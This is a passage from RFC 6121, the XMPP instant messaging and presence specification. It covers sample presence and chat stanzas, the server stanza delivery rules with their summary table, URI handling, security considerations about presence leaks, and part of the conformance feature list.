           to='romeo@example.net/orchard'
           type='result'>
         <query xmlns='jabber:iq:roster'>
           <item jid='juliet@example.com'
                 name='Juliet'
                 subscription='both'>
             <group>Friends</group>
           </item>
           <item jid='benvolio@example.org'
                 name='Benvolio'
                 subscription='to'/>
           <item jid='mercutio@example.org'
                 name='Mercutio'
                 subscription='from'/>
         </query>
       </iq>

Saint-Andre                  Standards Track                   [Page 78]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   Now the user begins a presence session.

   Example 3: User sends initial presence

   UC: <presence/>

   Example 4: User's server sends presence probes to contacts with
   subscription="to" and subscription="both" on behalf of the user

   US: <presence
           from='romeo@example.net'
           to='juliet@example.com'
           type='probe'/>

   US: <presence
           from='romeo@example.net'
           to='benvolio@example.org'
           type='probe'/>

   Example 5: User's server sends initial presence to contacts with
   subscription="from" and subscription="both" on behalf of the user's
   available resource, as well as to user

   US: <presence
           from='romeo@example.net/orchard'
           to='juliet@example.com'/>

   US: <presence
           from='romeo@example.net/orchard'
           to='mercutio@example.org'/>

   US: <presence
           from='romeo@example.net/orchard'
           to='romeo@example.net'/>

   Example 6: Contacts' servers reply to presence probe on behalf of all
   available resources

   CS: <presence
           from='juliet@example.com/balcony'
           to='romeo@example.net'
           xml:lang='en'>
         <show>away</show>
         <status>be right back</status>
         <priority>0</priority>
       </presence>

Saint-Andre                  Standards Track                   [Page 79]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   CS: <presence
           from='juliet@example.com/chamber'
           to='romeo@example.net'>
         <priority>1</priority>
       </presence>

   CS: <presence
           from='benvolio@example.org/pda'
           to='romeo@example.net'
           xml:lang='en'>
         <show>dnd</show>
         <status>gallivanting</status>
       </presence>

   Example 7: Contacts' servers deliver user's initial presence to all
   available resources

   CS: <presence
           from='romeo@example.net/orchard'
           to='juliet@example.com'/>

   CS: <presence
           from='romeo@example.net/orchard'
           to='juliet@example.com'/>

   CS: <presence
           from='romeo@example.net/orchard'
           to='mercutio@example.org'/>

   Example 8: User sends directed presence to another user not in his
   roster

   UC: <presence
           from='romeo@example.net/orchard'
           to='nurse@example.com'
           xml:lang='en'>
         <show>dnd</show>
         <status>courting Juliet</status>
         <priority>0</priority>
       </presence>

   Now the user engages in a chat session with one of his contacts.

Saint-Andre                  Standards Track                   [Page 80]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   Example 9: A threaded conversation

   CC: <message
           from='juliet@example.com/balcony'
           to='romeo@example.net'
           type='chat'
           xml:lang='en'>
         <body>My ears have not yet drunk a hundred words</body>
         <thread>e0ffe42b28561960c6b12b944a092794b9683a38</thread>
       </message>

   CC: <message
           from='juliet@example.com/balcony'
           to='romeo@example.net'
           type='chat'
           xml:lang='en'>
         <body>Of that tongue's utterance, yet I know the sound:</body>
         <thread>e0ffe42b28561960c6b12b944a092794b9683a38</thread>
       </message>

   CC: <message
           from='juliet@example.com/balcony'
           to='romeo@example.net'
           type='chat'
           xml:lang='en'>
         <body>Art thou not Romeo, and a Montague?</body>
         <thread>e0ffe42b28561960c6b12b944a092794b9683a38</thread>
       </message>

   UC: <message
           from='romeo@example.net/orchard'
           to='juliet@example.com/balcony'
           type='chat'
           xml:lang='en'>
         <body>Neither, fair saint, if either thee dislike.</body>
         <thread>e0ffe42b28561960c6b12b944a092794b9683a38</thread>
       </message>

   CC: <message
           from='juliet@example.com/balcony'
           to='romeo@example.net/orchard'
           type='chat'
           xml:lang='en'>
         <body>How cam'st thou hither, tell me, and wherefore?</body>
         <thread>e0ffe42b28561960c6b12b944a092794b9683a38</thread>
       </message>

   And so on.

Saint-Andre                  Standards Track                   [Page 81]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   The user can also send subsequent presence broadcast.

   Example 10: User sends updated available presence for broadcast

   UC: <presence xml:lang='en'>
         <show>away</show>
         <status>I shall return!</status>
         <priority>1</priority>
       </presence>

   Example 11: User's server broadcasts updated presence to the contacts
   who have a subscription of type "both" or "from" (but not to the
   entity to which the user sent directed presence)

   US: <presence
           from='romeo@example.net/orchard'
           to='juliet@example.com'
           xml:lang='en'>
         <show>away</show>
         <status>I shall return!</status>
         <priority>1</priority>
       </presence>

   US: <presence
           from='romeo@example.net/orchard'
           to='mercutio@example.org'
           xml:lang='en'>
         <show>away</show>
         <status>I shall return!</status>
         <priority>1</priority>
       </presence>

   Example 12: Contacts' servers deliver updated presence

   CS: <presence
           from='romeo@example.net/orchard'
           to='juliet@example.com'
           xml:lang='en'>
         <show>away</show>
         <status>I shall return!</status>
         <priority>1</priority>
       </presence>

Saint-Andre                  Standards Track                   [Page 82]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   CS: <presence
           from='romeo@example.net/orchard'
           to='juliet@example.com'
           xml:lang='en'>
         <show>away</show>
         <status>I shall return!</status>
         <priority>1</priority>
       </presence>

   CS: <presence
           from='romeo@example.net/orchard'
           to='mercutio@example.org'
           xml:lang='en'>
         <show>away</show>
         <status>I shall return!</status>
         <priority>1</priority>
       </presence>

   Example 13: One of the contact's resources broadcasts unavailable
   notification

   CC: <presence from='juliet@example.com/chamber' type='unavailable'/>

   Example 14: Contact's server sends unavailable notification to user

   CS: <presence
           from='juliet@example.com/chamber'
           to='romeo@example.net'
           type='unavailable'/>

   Now the user ends his presence session.

   Example 15: User sends unavailable notification

   UC: <presence type='unavailable' xml:lang='en'>
         <status>gone home</status>
       </presence>

   Example 16: User's server broadcasts unavailable notification to
   contacts as well as to the entity to whom the user sent directed
   presence

Saint-Andre                  Standards Track                   [Page 83]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   US: <presence
           from='romeo@example.net/orchard'
           to='juliet@example.com'
           type='unavailable'
           xml:lang='en'>
         <status>gone home</status>
       </presence>

   US: <presence
           from='romeo@example.net/orchard'
           to='mercutio@example.org'
           type='unavailable'
           xml:lang='en'>
         <status>gone home</status>
       </presence>

   US: <presence
           from='romeo@example.net/orchard'
           to='nurse@example.com'
           type='unavailable'
           xml:lang='en'>
         <status>gone home</status>
       </presence>

   Finally the user closes his stream and the server responds in kind.

   Example 17: User closes stream

   UC: </stream:stream>

   Example 18: User's server closes stream

   US: </stream:stream>

   THE END

[8](#section-8).  Server Rules for Processing XML Stanzas

   Basic server rules for processing XML stanzas are defined in
   [[XMPP-CORE](#ref-XMPP-CORE)], and the reader is referred to that specification for
   underlying rules and security implications.  This section defines
   supplementary rules for XMPP instant messaging and presence servers.

   Some delivery rules defined in this section specify the use of
   "offline storage", i.e., the server's act of storing a message stanza
   on behalf of the user and then delivering it when the user next
   becomes available.  For recommendations regarding offline message
   storage, refer to [[XEP-0160](#ref-XEP-0160)].

Saint-Andre                  Standards Track                   [Page 84]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

[8.1](#section-8.1).  General Considerations

   [XMPP-CORE] discusses general considerations for stanza delivery, in
   particular the tradeoffs between (i) providing an acceptable level of
   service regarding stanza delivery and (ii) preventing directory
   harvesting attacks and presence leaks.  However, the concept of a
   directory harvesting attack does not apply if a contact is known to
   and trusted by a user (because the contact is in the user's roster as
   described under [Section 2](#section-2)).  Similarly, the concept of a presence
   leak does not apply if a contact is authorized to know a user's
   presence (by means of a presence subscription as described under
   [Section 3](#section-3)) or if the user has voluntarily sent presence to an entity
   (by means of directed presence as described under [Section 4.6](#section-4.6)).
   Therefore, in cases where the following sections guard against
   directory harvesting attacks and presence leaks by providing an
   alternative of (a) silently ignoring a stanza or (b) returning an
   error, a server SHOULD return an error if the originating entity is
   in the user's roster (when the error would reveal whether the user's
   account exists) or is authorized to receive presence from the user or
   has received directed presence from the user (when the error would
   reveal the presence of a user's resource).

      Security Warning: All of the stanza processing rules described
      below are defined with the understanding that they will be applied
      subject to enforcement of relevant privacy and security policies,
      such as those deployed by means of [[XEP-0016](#ref-XEP-0016)] or [[XEP-0191](#ref-XEP-0191)].  The
      conformance language (MUST, SHOULD, etc.) in the following
      sections is not meant to override any such local service policies.

[8.2](#section-8.2).  No 'to' Address

   If the stanza possesses no 'to' attribute, the rules defined in
   [[XMPP-CORE](#ref-XMPP-CORE)] apply.

[8.3](#section-8.3).  Remote Domain

   If the domainpart of the address contained in the 'to' attribute of
   an outbound stanza does not match a configured domain of the server
   itself, then the rules provided in Section 10.4 of [[XMPP-CORE](#ref-XMPP-CORE)] apply.

      Interoperability Note: [RFC 3921](/doc/html/rfc3921) specified how to use the _im._xmpp
      and _pres._xmpp SRV records [[IMP-SRV](#ref-IMP-SRV "\"Address Resolution for Instant Messaging and Presence\"")] as a fallback method for
      discovering whether a remote instant messaging and presence
      service communicates via XMPP.  Because those SRV records have not
      been widely deployed, this document no longer specifies their use,
      and new implementations are not encouraged.

Saint-Andre                  Standards Track                   [Page 85]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

[8.4](#section-8.4).  Local Domain

   If the domainpart of the JID contained in the 'to' attribute matches
   one of the configured domains of the server, the domain is serviced
   by the server itself (not by a specialized local service), and the
   JID is of the form <domainpart> or <domainpart/resourcepart>, the
   rules defined in [[XMPP-CORE](#ref-XMPP-CORE)] apply.

[8.5](#section-8.5).  Local User

   If the 'to' address specifies a bare JID <localpart@domainpart> or
   full JID <localpart@domainpart/resourcepart> where the domainpart of
   the JID matches a configured domain that is serviced by the server
   itself, the server MUST proceed as follows.

[8.5.1](#section-8.5.1).  No Such User

   If the user account identified by the 'to' attribute does not exist,
   how the stanza is processed depends on the stanza type.

   o  For an IQ stanza, the server MUST return a <service-unavailable/>
      stanza error to the sender.

   o  For a message stanza, the server MUST either (a) silently ignore
      the message or (b) return a <service-unavailable/> stanza error to
      the sender.

   o  For a presence stanza with no 'type' attribute or a 'type'
      attribute of "unavailable", the server MUST silently ignore the
      stanza.

   o  For a presence stanza of type "subscribe", "subscribed",
      "unsubscribe", or "unsubscribed", the server MUST silently ignore
      the stanza.

   o  For a presence stanza of type "probe", the server MUST either (a)
      silently ignore the stanza or (b) return a presence stanza of type
      "unsubscribed".

[8.5.2](#section-8.5.2).  localpart@domainpart

   If the JID contained in the 'to' attribute is of the form
   <localpart@domainpart>, then the server MUST adhere to the following
   rules.

Saint-Andre                  Standards Track                   [Page 86]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

[8.5.2.1](#section-8.5.2.1).  Available or Connected Resources

   If there is at least one available resource or connected resource,
   how the stanza is processed depends on the stanza type.

[8.5.2.1.1](#section-8.5.2.1.1).  Message

   For a message stanza of type "normal":

   o  If all of the available resources have a negative presence
      priority then the server SHOULD either (a) store the message
      offline for later delivery or (b) return a stanza error to the
      sender, which SHOULD be <service-unavailable/>.

   o  If there is one available resource with a non-negative presence
      priority then the server MUST deliver the message to that
      resource.

   o  If there is more than one resource with a non-negative presence
      priority then the server MUST either (a) deliver the message to
      the "most available" resource or resources (according to the
      server's implementation-specific algorithm, e.g., treating the
      resource or resources with the highest presence priority as "most
      available") or (b) deliver the message to all of the non-negative
      resources.

   For a message stanza of type "chat":

   o  If the only available resource has a negative presence priority
      then the server SHOULD either (a) store the message offline for
      later delivery or (b) return a stanza error to the sender, which
      SHOULD be <service-unavailable/>.

   o  If the only available resource has a non-negative presence
      priority then the server MUST deliver the message to that
      resource.

   o  If there is more than one resource with a non-negative presence
      priority then the server MUST either (a) deliver the message to
      the "most available" resource or resources (according to the
      server's implementation-specific algorithm, e.g., treating the
      resource or resources with the highest presence priority as "most
      available") or (b) deliver the message to all of the non-negative
      resources that have opted in to receive chat messages.

   For a message stanza of type "groupchat", the server MUST NOT deliver
   the stanza to any of the available resources but instead MUST return
   a stanza error to the sender, which SHOULD be <service-unavailable/>.

Saint-Andre                  Standards Track                   [Page 87]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   For a message stanza of type "headline":

   o  If the only available resource has a negative presence priority
      then the server MUST silently ignore the stanza.

   o  If the only available resource has a non-negative presence
      priority then the server MUST deliver the message to that
      resource.

   o  If there is more than one resource with a non-negative presence
      priority then the server MUST deliver the message to all of the
      non-negative resources.

   For a message stanza of type "error", the server MUST silently ignore
   the message.

   However, for any message type the server MUST NOT deliver the stanza
   to any available resource with a negative priority; if the only
   available resource has a negative priority, the server SHOULD handle
   the message as if there were no available resources or connected
   resources as described under [Section 8.5.2.2](#section-8.5.2.2).

   In all cases, the server MUST NOT rewrite the 'to' attribute (i.e.,
   it MUST leave it as <localpart@domainpart> rather than change it to
   <localpart@domainpart/resourcepart>).

[8.5.2.1.2](#section-8.5.2.1.2).  Presence

   For a presence stanza with no type or of type "unavailable", the
   server MUST deliver it to all available resources.

   For a presence stanza of type "subscribe", "subscribed",
   "unsubscribe", or "unsubscribed", the server MUST adhere to the rules
   defined under [Section 3](#section-3) and summarized under [Appendix A](#appendix-A).

   For a presence stanza of type "probe", the server MUST handle it
   directly as described under [Section 4.3](#section-4.3).

   In all cases, the server MUST NOT rewrite the 'to' attribute (i.e.,
   it MUST leave it as <localpart@domainpart> rather than change it to
   <localpart@domainpart/resourcepart>).

[8.5.2.1.3](#section-8.5.2.1.3).  IQ

   For an IQ stanza, the server itself MUST reply on behalf of the user
   with either an IQ result or an IQ error, and MUST NOT deliver the IQ
   stanza to any of the user's available resources.  Specifically, if
   the semantics of the qualifying namespace define a reply that the

Saint-Andre                  Standards Track                   [Page 88]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   server can provide on behalf of the user, then the server MUST reply
   to the stanza on behalf of the user by returning either an IQ stanza
   of type "result" or an IQ stanza of type "error" that is appropriate
   to the original payload; if not, then the server MUST reply with a
   <service-unavailable/> stanza error.

[8.5.2.2](#section-8.5.2.2).  No Available or Connected Resources

   If there are no available resources or connected resources associated
   with the user, how the stanza is processed depends on the stanza
   type.

[8.5.2.2.1](#section-8.5.2.2.1).  Message

   For a message stanza of type "normal" or "chat", the server SHOULD
   either (a) add the message to offline storage or (b) return a stanza
   error to the sender, which SHOULD be <service-unavailable/>.

   For a message stanza of type "groupchat", the server MUST return an
   error to the sender, which SHOULD be <service-unavailable/>.

   For a message stanza of type "headline" or "error", the server MUST
   silently ignore the message.

[8.5.2.2.2](#section-8.5.2.2.2).  Presence

   For a presence stanza with no type or of type "unavailable", the
   server SHOULD silently ignore the stanza by not storing it for later
   delivery and not replying to it on behalf of the user.

   For a presence stanza of type "subscribe", "subscribed",
   "unsubscribe", or "unsubscribed", the server MUST adhere to the rules
   defined under [Section 3](#section-3) and summarized under [Appendix A](#appendix-A).

   For a presence stanza of type "probe", the server MUST handle it
   directly as described under [Section 4.3](#section-4.3).

[8.5.2.2.3](#section-8.5.2.2.3).  IQ

   For an IQ stanza, the server itself MUST reply on behalf of the user
   with either an IQ result or an IQ error.  Specifically, if the
   semantics of the qualifying namespace define a reply that the server
   can provide on behalf of the user, then the server MUST reply to the
   stanza on behalf of the user by returning either an IQ stanza of type
   "result" or an IQ stanza of type "error" that is appropriate to the
   original payload; if not, then the server MUST reply with a <service-
   unavailable/> stanza error.

Saint-Andre                  Standards Track                   [Page 89]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

[8.5.3](#section-8.5.3).  localpart@domainpart/resourcepart

   If the domainpart of the JID contained in the 'to' attribute of an
   inbound stanza matches one of the configured domains of the server
   itself and the JID contained in the 'to' attribute is of the form
   <localpart@domainpart/resourcepart>, then the server MUST adhere to
   the following rules.

[8.5.3.1](#section-8.5.3.1).  Resource Matches

   If an available resource or connected resource exactly matches the
   full JID, how the stanza is processed depends on the stanza type.

   o  For an IQ stanza of type "get" or "set", if the intended recipient
      does not share presence with the requesting entity either by means
      of a presence subscription of type "both" or "from" or by means of
      directed presence, then the server SHOULD NOT deliver the IQ
      stanza but instead SHOULD return a <service-unavailable/> stanza
      error to the requesting entity.  This policy helps to prevent
      presence leaks (see [Section 11](#section-11)).

   o  For an IQ stanza of type "result" or "error", the server MUST
      deliver the stanza to the resource.

   o  For a message stanza, the server MUST deliver the stanza to the
      resource.

   o  For a presence stanza with no 'type' attribute or a 'type'
      attribute of "unavailable", the server MUST deliver the stanza to
      the resource.

   o  For a presence stanza of type "subscribe", "subscribed",
      "unsubscribe", or "unsubscribed", the server MUST follow the
      guidelines provided under [Section 3](#section-3).

   o  For a presence stanza of type "probe", the server MUST follow the
      guidelines provided under [Section 4.3](#section-4.3).

[8.5.3.2](#section-8.5.3.2).  No Resource Matches

   If no available resource or connected resource exactly matches the
   full JID, how the stanza is processed depends on the stanza type.

Saint-Andre                  Standards Track                   [Page 90]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

[8.5.3.2.1](#section-8.5.3.2.1).  Message

   For a message stanza of type "normal", "groupchat", or "headline",
   the server MUST either (a) silently ignore the stanza or (b) return
   an error stanza to the sender, which SHOULD be <service-
   unavailable/>.

   For a message stanza of type "chat":

   o  If there is no available or connected resource, the server MUST
      either (a) store the message offline for later delivery or (b)
      return an error stanza to the sender, which SHOULD be <service-
      unavailable/>.

   o  If all of the available resources have a negative presence
      priority then the server SHOULD (a) store the message offline for
      later delivery or (b) return a stanza error to the sender, which
      SHOULD be <service-unavailable/>.

   o  If there is one available resource with a non-negative presence
      priority then the server MUST deliver the message to that
      resource.

   o  If there is more than one resource with a non-negative presence
      priority then the server MUST either (a) deliver the message to
      the "most available" resource or resources (according to the
      server's implementation-specific algorithm, e.g., treating the
      resource or resources with the highest presence priority as "most
      available") or (b) deliver the message to all of the non-negative
      resources that have opted in to receive chat messages.

   For a message stanza of type "error", the server MUST silently ignore
   the stanza.

[8.5.3.2.2](#section-8.5.3.2.2).  Presence

   For a presence stanza with no 'type' attribute or a 'type' attribute
   of "unavailable", the server MUST silently ignore the stanza.

   For a presence stanza of type "subscribe", the server MUST follow the
   guidelines provided under [Section 3.1.3](#section-3.1.3).

   For a presence stanza of type "subscribed", "unsubscribe", or
   "unsubscribed", the server MUST ignore the stanza.

   For a presence stanza of type "probe", the server MUST follow the
   guidelines provided under [Section 4.3](#section-4.3).

Saint-Andre                  Standards Track                   [Page 91]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

[8.5.3.2.3](#section-8.5.3.2.3).  IQ

   For an IQ stanza, the server MUST return a <service-unavailable/>
   stanza error to the sender.

[8.5.4](#section-8.5.4).  Summary of Message Delivery Rules

   The following table summarizes the message (not stanza) delivery
   rules described earlier in this section.  The left column shows
   various combinations of conditions (non-existent account, no active
   resources, only one resource and it has a negative presence priority,
   only one resource and it has a non-negative presence priority, or
   more than one resource and each one has a non-negative presence
   priority) and 'to' addresses (bare JID, full JID matching an
   available resource, or full JID matching no available resource).  The
   subsequent columns list the four primary message types (normal, chat,
   groupchat, or headline) along with six possible delivery options:
   storing the message offline (O), bouncing the message with a stanza
   error (E), silently ignoring the message (S), delivering the message
   to the resource specified in the 'to' address (D), delivering the
   message to the "most available" resource or resources according to
   the server's implementation-specific algorithm, e.g., treating the
   resource or resources with the highest presence priority as "most
   available" (M), or delivering the message to all resources with non-
   negative presence priority (A -- where for chat messages "all
   resources" can mean the set of resources that have explicitly opted
   in to receiving every chat message).  The '/' character stands for
   "exclusive or".  The server SHOULD observe the rules given in [section](#section-8.1)
   [8.1](#section-8.1) when choosing which action to take for a particular message.

Saint-Andre                  Standards Track                   [Page 92]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   Table 1: Message Delivery Rules

   +----------------------------------------------------------+
   | Condition        | Normal | Chat  | Groupchat | Headline |
   +----------------------------------------------------------+
   | ACCOUNT DOES NOT EXIST                                   |
   |  bare            |  S/E   |  S/E  |     E     |    S     |
   |  full            |  S/E   |  S/E  |    S/E    |   S/E    |
   +----------------------------------------------------------+
   | ACCOUNT EXISTS, BUT NO ACTIVE RESOURCES                  |
   |  bare            |  O/E   |  O/E  |     E     |    S     |
   |  full (no match) |  S/E   |  O/E  |    S/E    |   S/E    |
   +----------------------------------------------------------+
   | 1+ NEGATIVE RESOURCES BUT ZERO NON-NEGATIVE RESOURCES    |
   |  bare            |  O/E   |  O/E  |     E     |    S     |
   |  full match      |   D    |   D   |     D     |    D     |
   |  full no match   |  S/E   |  O/E  |    S/E    |   S/E    |
   +----------------------------------------------------------+
   | 1 NON-NEGATIVE RESOURCE                                  |
   |  bare            |   D    |   D   |     E     |    D     |
   |  full match      |   D    |   D   |     D     |    D     |
   |  full no match   |  S/E   |   D   |    S/E    |   S/E    |
   +----------------------------------------------------------+
   | 1+ NON-NEGATIVE RESOURCES                                |
   |  bare            |  M/A   |  M/A* |     E     |    A     |
   |  full match      |   D    |  D/A* |     D     |    D     |
   |  full no match   |  S/E   |  M/A* |    S/E    |   S/E    |
   +----------------------------------------------------------+

      * For messages of type "chat", a server SHOULD NOT act in
      accordance with option (A) unless clients can explicitly opt in to
      receiving all chat messages; however, methods for opting in are
      outside the scope of this specification.

[9](#section-9).  Handling of URIs

   The addresses of XMPP entities as used in communication over an XMPP
   network (e.g., in the 'from' and 'to' addresses of an XML stanza)
   MUST NOT be prepended with a Uniform Resource Identifier [[URI](#ref-URI "\"Uniform Resource Identifier (URI): Generic Syntax\"")]
   scheme.

   However, an application that is external to XMPP itself (e.g., a page
   on the World Wide Web) might need to identify an XMPP entity either
   as a URI or as an Internationalized Resource Identifier [[IRI](#ref-IRI "\"Internationalized Resource Identifiers (IRIs)\"")], and an
   XMPP client might need to interact with such an external application
   (for example, an XMPP client might be invoked by clicking a link
   provided on a web page).  In the context of such interactions, XMPP
   clients are encouraged to handle addresses that are encoded as

Saint-Andre                  Standards Track                   [Page 93]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   "xmpp:" URIs and IRIs as specified in [[XMPP-URI](#ref-XMPP-URI)] and further
   described in [[XEP-0147](#ref-XEP-0147)].  Although XMPP clients are also encouraged
   to handle addresses that are encoded as "im:" URIs as specified in
   [[CPIM](#ref-CPIM "\"Common Profile for Instant Messaging (CPIM)\"")] and "pres:" URIs as specified in [[CPP](#ref-CPP "\"Common Profile for Presence (CPP)\"")], they can do so by
   removing the "im:" or "pres:" scheme and entrusting address
   resolution to the server as specified under [Section 8.3](#section-8.3).

[10](#section-10).  Internationalization Considerations

   For internationalization considerations, refer to the relevant
   section of [[XMPP-CORE](#ref-XMPP-CORE)].

[11](#section-11).  Security Considerations

   Core security considerations for XMPP are provided in Section 13 of
   [[XMPP-CORE](#ref-XMPP-CORE)], including discussion of channel encryption,
   authentication, information leaks, denial-of-service attacks, and
   interdomain federation.

   Section 13.1 of [[XMPP-CORE](#ref-XMPP-CORE)] outlines the architectural roles of
   clients and servers in typical deployments of XMPP, and discusses the
   security properties associated with those roles.  These roles have an
   impact on the security of instant messages, presence subscriptions,
   and presence notifications as described in this document.  In
   essence, an XMPP user registers (or has provisioned) an account on an
   XMPP server and therefore places some level of trust in the server to
   complete various tasks on the user's behalf, enforce security
   policies, etc.  Thus it is the server's responsibility to:

   1.  Preferably mandate the use of channel encryption for
       communication with local clients and remote servers.

   2.  Authenticate any client that wishes to access the user's account.

   3.  Process XML stanzas to and from clients that have authenticated
       as the user (specifically with regard to instant messaging and
       presence functionality, store the user's roster, process inbound
       and outbound subscription requests and responses, generate and
       handle presence probes, broadcast outbound presence
       notifications, route outbound messages, and deliver inbound
       messages and presence notifications).

   As discussed in Sections [13.1](#section-13.1) and [13.4](#section-13.4) of [[XMPP-CORE](#ref-XMPP-CORE)], even if the
   server fulfills the foregoing responsibilities, the client does not
   have any assurance that stanzas it might exchange with other clients
   (whether on the same server or a remote server) are protected for all
   hops along the XMPP communication path, or within the server itself.
   It is the responsibility of the client to use an appropriate

Saint-Andre                  Standards Track                   [Page 94]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   technology for encryption and signing of XML stanzas if it wishes to
   ensure end-to-end confidentiality and integrity of its
   communications.

   Additional considerations that apply only to instant messaging and
   presence applications of XMPP are defined in several places within
   this document; specifically:

   o  When a server processes an inbound presence stanza of type "probe"
      whose intended recipient is a user associated with one of the
      server's configured domains, the server MUST NOT reveal the user's
      presence if the sender is an entity that is not authorized to
      receive that information as determined by presence subscriptions
      (see [Section 4](#section-4)).

   o  A user's server MUST NOT leak the user's network availability to
      entities who are not authorized to know the user's presence.  In
      XMPP itself, authorization takes the form of an explicit
      subscription from a contact to the user (as described under
      [Section 3](#section-3)).  However, some XMPP deployments might consider an
      entity to be authorized if there is an existing trust relationship
      between the entity and the user who is generating presence
      information (as an example, a corporate deployment of XMPP might
      automatically add the user's presence information to a private
      directory of employees if the organization mandates the sharing of
      presence information as part of an employment agreement).

   o  When a server processes an outbound presence stanza with no type
      or of type "unavailable", it MUST follow the rules defined under
      [Section 4](#section-4) in order to ensure that such presence information is not
      sent to entities that are not authorized to know such information.

   o  A client MAY ignore the <status/> element when contained in a
      presence stanza of type "subscribe", "unsubscribe", "subscribed",
      or "unsubscribed"; this can help prevent "presence subscription
      spam".

[12](#section-12).  Conformance Requirements

   This section describes a protocol feature set that summarizes the
   conformance requirements of this specification.  This feature set is
   appropriate for use in software certification, interoperability
   testing, and implementation reports.  For each feature, this section
   provides the following information:

   o  A human-readable name

   o  An informational description

Saint-Andre                  Standards Track                   [Page 95]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   o  A reference to the particular section of this document that
      normatively defines the feature

   o  Whether the feature applies to the Client role, the Server role,
      or both (where "N/A" signifies that the feature is not applicable
      to the specified role)

   o  Whether the feature MUST or SHOULD be implemented, where the
      capitalized terms are to be understood as described in [[KEYWORDS](#ref-KEYWORDS)]

   The feature set specified here attempts to adhere to the concepts and
   formats proposed by Larry Masinter within the IETF's NEWTRK Working
   Group in 2005, as captured in [[INTEROP](#ref-INTEROP "\"Formalizing IETF Interoperability Reporting\"")].  Although this feature set
   is more detailed than called for by [[REPORTS](#ref-REPORTS "\"Guidance on Interoperation and Implementation Reports for Advancement to Draft Standard\"")], it provides a suitable
   basis for the generation of implementation reports to be submitted in
   support of advancing this specification from Proposed Standard to
   Draft Standard in accordance with [[PROCESS](#ref-PROCESS "\"The Internet Standards Process -- Revision 3\"")].

   Feature:  message-body
   Description:  Support the <body/> child element of the <message/>
      stanza.
   Section:  [Section 5.2.3](#section-5.2.3)
   Roles:  Client MUST, Server N/A.

   Feature:  message-subject
   Description:  Support the <subject/> child element of the <message/>
      stanza.
   Section:  [Section 5.2.4](#section-5.2.4)
   Roles:  Client SHOULD, Server N/A.

   Feature:  message-thread
   Description:  Support the <thread/> child element of the <message/>
      stanza.
   Section:  [Section 5.2.5](#section-5.2.5)
   Roles:  Client SHOULD, Server N/A.

   Feature:  message-type-support
   Description:  Support reception of messages of type "normal", "chat",
      "groupchat", "headline", and "error".
   Section:  [Section 5.2.2](#section-5.2.2)
   Roles:  Client SHOULD, Server N/A.

   Feature:  message-type-deliver
   Description:  Appropriately deliver messages of type "normal",
      "chat", "groupchat", "headline", and "error".
   Section:  [Section 8](#section-8)
   Roles:  Client N/A, Server SHOULD.

Saint-Andre                  Standards Track                   [Page 96]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   Feature:  presence-notype
   Description:  Treat a presence stanza with no 'type' attribute as
      indicating availability.
   Section:  [Section 4.7.1](#section-4.7.1)
   Roles:  Client MUST, Server MUST.

   Feature:  presence-probe
   Description:  Send and receive presence stanzas with a 'type'
      attribute of "probe" for the discovery of presence information.
   Section:  [Section 4.7.1](#section-4.7.1)
   Roles:  Client N/A, Server MUST.

   Feature:  presence-sub-approval
   Description:  Treat an outbound presence stanza of type "subscribed"
      as the act of approving a presence subscription request previously
      received from another entity, and treat an inbound presence stanza
      of type "subscribed" as a subscription approval from another
      entity.
   Section:  [Section 3.1](#section-3.1)
   Roles:  Client MUST, Server MUST.

   Feature:  presence-sub-cancel
   Description:  Treat an outbound presence stanza of type
      "unsubscribed" as the act of denying a subscription request
      received from another entity or canceling a subscription approval
      previously granted to another entity, and treat an inbound
      presence stanza of type "unsubscribed" as an subscription denial
      or cancellation from another entity.
   Section:  [Section 3.2](#section-3.2)
   Roles:  Client MUST, Server MUST.

   Feature:  presence-sub-preapproval
   Description:  Treat an outbound presence stanza of type "subscribed"
      in certain circumstances as the act of pre-approving a
      subscription request received from another entity; this includes
      support for the 'approved' attribute of the <item/> element within
      the 'jabber:iq:roster' namespace.
   Section:  [Section 3.4](#section-3.4)
   Roles:  Client MAY, Server MAY.

   Feature:  presence-sub-request
   Description:  Treat an outbound presence stanza of type "subscribe"
      as the act of requesting a subscription to the presence
      information of another entity, and treat an inbound presence
      stanza of type "subscribe" as a presence subscription request from
      another entity.
   Section:  [Section 3.1](#section-3.1)
   Roles:  Client MUST, Server MUST.

Saint-Andre                  Standards Track                   [Page 97]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   Feature:  presence-sub-unsubscribe
   Description:  Treat an outbound presence stanza of type "unsubscribe"
      as the act of unsubscribing from another entity, and treat an
      inbound presence stanza of type "unsubscribe" as an unsubscribe
      notification from another entity.
   Section:  [Section 3.3](#section-3.3)
   Roles:  Client MUST, Server MUST.

   Feature:  presence-unavailable
   Description:  Treat a presence stanza with a 'type' attribute of
      "unavailable" as indicating lack of availability.
   Section:  [Section 4.7.1](#section-4.7.1)
   Roles:  Client MUST, Server MUST.

   Feature:  roster-get
   Description:  Treat an IQ stanza of type "get" containing an empty
      <query/> element qualified by the 'jabber:iq:roster' namespace as
      a request to retrieve the roster information associated with an
      account on a server.
   Section:  [Section 2.1.3](#section-2.1.3)
   Roles:  Client MUST, Server MUST.

